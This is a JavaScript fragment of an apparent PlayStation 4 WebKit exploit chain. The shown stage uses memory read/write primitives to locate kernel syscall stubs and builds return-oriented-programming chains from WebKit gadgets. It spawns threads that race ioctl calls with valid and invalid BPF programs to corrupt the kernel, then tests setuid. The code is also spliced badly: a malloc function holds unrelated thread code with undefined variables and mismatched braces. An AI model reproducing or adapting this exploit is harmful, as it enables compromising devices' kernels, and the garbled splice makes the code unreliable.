            'jmp addr': getGadget('libSceWebKit2', 0x00d65230),
        }
    };
}
 
    log("--- welcome to stage3 ---");
    
    var kview = new Uint8Array(0x1000);
    var kstr = p.leakval(kview).add32(0x10);
    var orig_kview_buf = p.read8(kstr);
    
    p.write8(kstr, window.libKernelBase);
    p.write4(kstr.add32(8), 0x40000); // high enough lel
    
    var countbytes;
    for (var i=0; i < 0x40000; i++)
    {
        if (kview[i] == 0x72 && kview[i+1] == 0x64 && kview[i+2] == 0x6c && kview[i+3] == 0x6f && kview[i+4] == 0x63)
        {
            countbytes = i;
            break;
        }
    }
    p.write4(kstr.add32(8), countbytes + 32);
    
    var dview32 = new Uint32Array(1);
    var dview8 = new Uint8Array(dview32.buffer);
    for (var i=0; i < countbytes; i++)
    {
        if (kview[i] == 0x48 && kview[i+1] == 0xc7 && kview[i+2] == 0xc0 && kview[i+7] == 0x49 && kview[i+8] == 0x89 && kview[i+9] == 0xca && kview[i+10] == 0x0f && kview[i+11] == 0x05)
        {
            dview8[0] = kview[i+3];
            dview8[1] = kview[i+4];
            dview8[2] = kview[i+5];
            dview8[3] = kview[i+6];
            var syscallno = dview32[0];
            window.syscalls[syscallno] = window.libKernelBase.add32(i);
        }
    }
       var chain = new window.RopChain;
    var returnvalue;
    p.fcall_ = function(rip, rdi, rsi, rdx, rcx, r8, r9) {
        chain.clear();
        
        chain.notimes = this.next_notime;
        this.next_notime = 1;
        
        chain.fcall(rip, rdi, rsi, rdx, rcx, r8, r9);
        
        chain.push(window.gadgets["pop rdi"]); // pop rdi
        chain.push(chain.ropframeptr.add32(0x3ff8)); // where
        chain.push(window.gadgets["mov [rdi], rax"]); // rdi = rax
        
        chain.push(window.gadgets["pop rax"]); // pop rax
        chain.push(p.leakval(0x41414242)); // where
        
        if (chain.run().low != 0x41414242) throw new Error("unexpected rop behaviour");
        returnvalue = p.read8(chain.ropframeptr.add32(0x3ff8)); //p.read8(chain.ropframeptr.add32(0x3ff8));
    }
    p.fcall = function()
    {
        var rv=p.fcall_.apply(this,arguments);
        return returnvalue;
    }
    p.readstr = function(addr){
        var addr_ = addr.add32(0); // copy
        var rd = p.read4(addr_);
        var buf = "";
        while (rd & 0xFF)
        {
            buf += String.fromCharCode(rd & 0xFF);
            addr_.add32inplace(1);
            rd = p.read4(addr_);
        }
        return buf;
    }
    
    p.syscall = function(sysc, rdi, rsi, rdx, rcx, r8, r9)
    {
        if (typeof sysc == "string") {
            sysc = window.syscallnames[sysc];
        }
        if (typeof sysc != "number") {
            throw new Error("invalid syscall");
        }
        
        var off = window.syscalls[sysc];
        if (off == undefined)
        {
            throw new Error("invalid syscall");
        }
        
        return p.fcall(off, rdi, rsi, rdx, rcx, r8, r9);
    }
    function malloc(size)
{
  var backing = new Uint8Array(0x10000 + size);

  window.nogc.push(backing);
  
var thread2 = new window.rop();

      thread2.clear();
      thread2.push(window.gadgets["ret"]); // nop
      thread2.push(window.gadgets["ret"]); // nop
      thread2.push(window.gadgets["ret"]); // nop

      thread2.push(window.gadgets["ret"]); // nop
      chain(thread2);

      p.write8(contextp, window.gadgets["ret"]); // rip -> ret gadget
      p.write8(contextp.add32(0x10), thread2.stackBase); // rsp

      var test = p.fcall(createThread, longjmp, contextp, stringify("GottaGoFast"));

      window.nogc.push(contextz);
      window.nogc.push(thread2);
  
   spawnthread(function (thread2) {
        interrupt1 = thread2.stackBase;
        thread2.push(window.gadgets["ret"]);
        thread2.push(window.gadgets["ret"]);
        thread2.push(window.gadgets["ret"]);
        thread2.push(window.gadgets["pop rdi"]); // pop rdi
        thread2.push(fd1); // what
        thread2.push(window.gadgets["pop rsi"]); // pop rsi
        thread2.push(0x8010427B); // what
        thread2.push(window.gadgets["pop rdx"]); // pop rdx
        thread2.push(bpf_valid_prog); // what
        thread2.push(window.gadgets["pop rsp"]); // pop rsp
        thread2.push(thread2.stackBase.add32(0x800)); // what
        thread2.count = 0x100;
        var cntr = thread2.count;
        thread2.push(window.syscalls[54]); // ioctl
        thread2.push_write8(thread2.stackBase.add32(cntr * 8), window.syscalls[54]); // restore ioctl
        thread2.push(window.gadgets["pop rsp"]); // pop rdx
        thread2.push(thread2.stackBase); // what
      });

      // ioctl() with invalid BPF program will be sprayed and eventually get used by the thread where the program has already been validated
      spawnthread(function (thread2) {
        interrupt2 = thread2.stackBase;
        thread2.push(window.gadgets["ret"]);
        thread2.push(window.gadgets["ret"]);
        thread2.push(window.gadgets["ret"]);
        thread2.push(window.gadgets["pop rdi"]); // pop rdi
        thread2.push(fd2); // what
        thread2.push(window.gadgets["pop rsi"]); // pop rsi
        thread2.push(0x8010427B); // what
        thread2.push(window.gadgets["pop rdx"]); // pop rdx
        thread2.push(bpf_invalid_prog); // what
        thread2.push(window.gadgets["pop rsp"]); // pop rsp
        thread2.push(thread2.stackBase.add32(0x800)); // what
        thread2.count = 0x100;
        var cntr = thread2.count;
        thread2.push(window.syscalls[54]); // ioctl
        thread2.push_write8(thread2.stackBase.add32(cntr * 8), window.syscalls[54]); // restore ioctl
        thread2.push(window.gadgets["pop rsp"]); // pop rdx
        thread2.push(thread2.stackBase); // what
      });

  var ptr     = p.read8(p.leakval(backing).add32(0x10));
  ptr.backing = backing;

  return ptr;
}

function mallocu32(size) {
  var backing = new Uint8Array(0x10000 + size * 4);

  window.nogc.push(backing);

  var ptr     = p.read8(p.leakval(backing).add32(0x10));
  ptr.backing = new Uint32Array(backing.buffer);

  return ptr;
}
   
    p.sptr = function(str) {
        var bufView = new Uint8Array(str.length+1);
        for (var i=0; i<str.length; i++) {
            bufView[i] = str.charCodeAt(i) & 0xFF;
        }
        window.nogc.push(bufView);
        return p.read8(p.leakval(bufView).add32(0x10));
    };
   
    log("loaded sycalls");

    var rtv = p.fcall(window.gadgets["mov rax, rdi"], 0x41414141);
    var pid = p.syscall("getpid");
    var uid = p.syscall("getuid");
    var suid = p.syscall("setuid", 0, 0x41414142).low;
    print("all good. fcall test retval = 4141414141");
    print("rtv = "+ rtv + " - uid: " + uid + " - pid: " + pid + " - suid: " + suid);
    print("....webkit full stage 90%....");
    
   
}
  


 
